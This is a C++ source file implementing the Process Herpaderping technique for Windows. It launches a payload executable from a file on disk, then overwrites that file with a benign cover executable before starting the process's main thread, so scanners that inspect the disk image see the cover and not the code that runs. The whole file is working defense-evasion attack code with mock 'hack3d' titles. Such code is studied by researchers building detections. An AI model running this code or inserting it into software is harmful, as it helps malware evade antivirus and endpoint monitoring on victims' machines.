#include "Herpaderping.h"

#include <iostream>

constexpr auto PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;
constexpr auto TARGET_PROCESS_TITLE = L"You have been hack3d!";

Herpaderping::Herpaderping(std::string path_to_source, 
						   std::string path_to_target, 
						   std::string path_to_cover,
						   const wchar_t* windows_station_to_run_on) :
	windows_station_to_run_on(windows_station_to_run_on),
	section_handle(),
	target_process(),
	target_file(),
	thread_handle(),
	source_file_payload(),
	ntdll_functions(std::make_unique<NtdllFunctions>()),
	path_to_source(path_to_source),
	path_to_target(path_to_target),
	path_to_cover(path_to_cover)
{ }

void Herpaderping::run_process_with_cover()
{
	read_source_payload();

	create_target_file_and_write_payload();
	
	create_target_process();
	
	cover_target_file();

	create_and_run_target_main_thread();
}

void Herpaderping::read_source_payload()
{
	HANDLE source_file = CreateFileA(this->path_to_source.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (INVALID_HANDLE_VALUE == source_file) {
		throw std::runtime_error("CreateFileA: failed to open source file. Error: " + error_to_str(GetLastError()));
	}

	DWORD source_file_size = GetFileSize(source_file, nullptr);
	if (INVALID_FILE_SIZE == source_file_size) {
		throw std::runtime_error("GetFileSize: failed to retreive source file size. Error: " + error_to_str(GetLastError()));
	}

	this->source_file_payload = std::make_unique<std::vector<char>>(source_file_size);
	if (!ReadFile(source_file, source_file_payload.get()->data(), source_file_size, nullptr, nullptr)) {
		throw std::runtime_error("ReadFile: failed to read source file. Error: " + error_to_str(GetLastError()));
	}
}

void Herpaderping::create_target_file_and_write_payload()
{
	this->target_file = CreateFileA(this->path_to_target.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (INVALID_HANDLE_VALUE == this->target_file) {
		throw std::runtime_error("CreateFileA: failed to create target file. Error: " + error_to_str(GetLastError()));
	}

	if (!WriteFile(this->target_file,
		source_file_payload.get()->data(),
		source_file_payload.get()->size(),
		nullptr,
		nullptr)) {
		throw std::runtime_error("WriteFile: failed to write source file to target file. Error: " + error_to_str(GetLastError()));
	}
}

void Herpaderping::create_target_process()
{
	// Create a section with this->target_file as its image.
	NTSTATUS create_section_return_value = ntdll_functions->NtCreateSection(&section_handle,
		SECTION_ALL_ACCESS,
		nullptr,
		nullptr,
		PAGE_READONLY,
		SEC_IMAGE,
		target_file);
	if (create_section_return_value) {
		throw std::runtime_error("NtCreateSection: failed to create section. Error: " + error_to_str(create_section_return_value));
	}

	// Create a process with the section created above.
	// TODO: return value?
	ntdll_functions->NtCreateProcessEx(&target_process,
		PROCESS_ALL_ACCESS,
		nullptr,
		GetCurrentProcess(),
		PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
		section_handle,
		nullptr,
		nullptr,
		FALSE);
}

void Herpaderping::cover_target_file()
{
	// Open and read target executable file.
	HANDLE cover_file_handle = CreateFileA(this->path_to_cover.c_str(),
		GENERIC_READ,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (INVALID_HANDLE_VALUE == cover_file_handle) {
		throw std::runtime_error("CreateFileA: failed to open cover file. Error: " + error_to_str(GetLastError()));
	}

	auto cover_file_size = GetFileSize(cover_file_handle, nullptr);
	if (INVALID_FILE_SIZE == cover_file_size) {
		throw std::runtime_error("GetFileSize: failed to get cover file size. Error: " + error_to_str(GetLastError()));
	}

	auto cover_file_content = std::make_unique<std::vector<char>>(cover_file_size);
	if (!ReadFile(cover_file_handle, cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
		throw std::runtime_error("ReadFile: failed to read cover file. Error: " + error_to_str(GetLastError()));
	}

	// Seek to the beginning of the target executable.
	if (INVALID_SET_FILE_POINTER == SetFilePointer(this->target_file, 0, nullptr, FILE_BEGIN)) {
		throw std::runtime_error("SetFilePointer: failed to set target file pointer. Error: " + error_to_str(GetLastError()));
	}

	// Overwrite the target executable with the content of the cover executable.
	if (!WriteFile(this->target_file, cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
		throw std::runtime_error("WriteFile: failed to overwrite target file. Error: " + error_to_str(GetLastError()));
	}
}

void Herpaderping::create_and_run_target_main_thread()
{
	PRTL_USER_PROCESS_PARAMETERS process_parameters = nullptr;
	UNICODE_STRING image_path_name;
	UNICODE_STRING command_line;
	UNICODE_STRING title;
	UNICODE_STRING desktop_info;
	PROCESS_BASIC_INFORMATION current_process_pbi;
	PEB64 current_process_peb;
	
	// TODO: return value?
	ntdll_functions->NtQueryInformationProcess(GetCurrentProcess(), 
		ProcessBasicInformation, 
		&current_process_pbi,
		sizeof(current_process_pbi), 
		nullptr);

	current_process_peb = *reinterpret_cast<PEB64*>(current_process_pbi.PebBaseAddress);

	// Initialize relevant parameters.
	ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(path_to_target).c_str());
	ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + path_to_target + "\"").c_str());
	ntdll_functions->RtlInitUnicodeString(&title, L"HACK3D!");
	ntdll_functions->RtlInitUnicodeString(&desktop_info, windows_station_to_run_on);

	ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
		&image_path_name,
		nullptr,
		nullptr,
		&command_line,
		reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS>(current_process_peb.ProcessParameters)->Environment,
		&title,
		&desktop_info,
		nullptr,
		nullptr,
		0);

	PROCESS_BASIC_INFORMATION pbi;
	ntdll_functions->NtQueryInformationProcess(this->target_process,
		ProcessBasicInformation, 
		&pbi, 
		sizeof(pbi), 
		nullptr);

	// Allocate space for the parameters in our created process.
	auto process_allocated_space = VirtualAllocEx(this->target_process,
		nullptr,
		process_parameters->MaximumLength + process_parameters->EnvironmentSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	if (NULL == process_allocated_space) {
		throw std::runtime_error("VirtualAllocEx: failed to allocate memory in target process. Error: " + error_to_str(GetLastError()));
	}

	process_parameters->Environment = reinterpret_cast<PBYTE>(process_allocated_space) + process_parameters->Length;

	// Write process parameters to the process.
	if (!WriteProcessMemory(this->target_process,
		process_allocated_space,
		process_parameters,
		process_parameters->MaximumLength + process_parameters->EnvironmentSize,
		nullptr)) {
		throw std::runtime_error("WriteProcessMemory: failed to write parameters to target process. Error: " + error_to_str(GetLastError()));
	}

	// Update the ProcessParameters in the process PEB to point to our parameters.
	if (!WriteProcessMemory(this->target_process,
		reinterpret_cast<unsigned char*>(pbi.PebBaseAddress) + offsetof(PEB64, ProcessParameters),
		&process_allocated_space,
		sizeof(process_allocated_space),
		nullptr)) {
		throw std::runtime_error("WriteProcessMemory: failed to update target process's PEB. Error: " + error_to_str(GetLastError()));
	}

	const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(this->source_file_payload.get()->data());
	const PIMAGE_NT_HEADERS64 payload_nt_header = reinterpret_cast<PIMAGE_NT_HEADERS64>(this->source_file_payload.get()->data() + payload_dos_header->e_lfanew);

	// Read createed process memory to find base address.
	PEB64 process_peb;
	if (!ReadProcessMemory(this->target_process,
		pbi.PebBaseAddress,
		&process_peb,
		sizeof(process_peb),
		nullptr)) {
		throw std::runtime_error("ReadProcessMemory: failed to read process memory. Error: " + error_to_str(GetLastError()));
	}

	// Calculate the absolute address of the entry point.
	ULONGLONG entry_point = process_peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;

	ntdll_functions->NtCreateThreadEx(&thread_handle,
		THREAD_ALL_ACCESS,
		nullptr,
		this->target_process,
		reinterpret_cast<PVOID>(entry_point),
		nullptr,
		0,
		0,
		0,
		0,
		nullptr);
	if (NULL == thread_handle) {
		throw std::runtime_error("NtCreateThreadEx: failed to create target process' main thread. Error: " + error_to_str(GetLastError()));
	}
}
 